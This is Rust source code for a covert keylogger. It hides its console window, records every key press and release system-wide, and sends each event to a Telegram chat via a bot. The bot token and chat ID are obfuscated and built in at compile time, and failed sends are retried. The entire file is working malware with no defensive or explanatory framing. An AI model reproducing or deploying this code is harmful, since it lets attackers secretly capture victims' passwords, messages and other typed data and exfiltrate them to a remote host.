#![windows_subsystem = "windows"]

use std::time::Duration;
use rdev::{EventType, listen};
use teloxide::prelude::*;
use tokio::sync::mpsc;

use obfstr::obfstr as s;

#[tokio::main]
async fn main() {
    let bot = Bot::new(s!(env!("BOT_TOKEN")));

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();

    let bot_task = tokio::spawn(async move {
        while let Some(message) = rx.recv().await {
            loop {
                match bot.send_message(s!(env!("CHAT_ID")).to_string(), message.clone()).await {
                    Ok(_)   => break,
                    Err(err) => {
                        eprintln!("Failed to send message with error: {:?}", err);
                        tokio::time::sleep(Duration::from_secs(5)).await; // Retry after 5 seconds if failed
                    }
                }
            }
        }
    });

    let task = {
        tokio::task::spawn_blocking(move || {
            listen(move |event| {
                let tx = tx.clone();
                tokio::spawn(async move {
                    match event.event_type {
                        EventType::KeyPress(key) => {
                            tx.send(format!("Pressed {:?}", key)).expect("Failed to add message to buffer");
                        }
                        EventType::KeyRelease(key) => {
                            tx.send(format!("Released {:?}", key)).expect("Failed to add message to buffer")
                        }
                        _ => {}
                    };
                });
            }).expect("Failed while listening to keyboard events");
        })
    };

    tokio::select! {
        _ = bot_task => {}
        _ = task => {}
    }
}
